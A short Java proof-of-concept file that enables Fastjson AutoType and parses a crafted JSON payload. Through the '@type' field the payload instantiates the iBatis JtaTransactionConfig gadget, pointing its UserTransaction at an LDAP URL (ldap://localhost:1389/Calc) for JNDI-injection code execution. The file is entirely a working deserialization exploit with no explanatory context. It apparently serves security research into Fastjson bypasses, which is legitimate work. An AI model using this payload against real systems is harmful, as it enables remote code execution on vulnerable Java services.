import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastjsonBypass3 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:1389/Calc\"}}";
        JSON.parse(poc);
    }
}
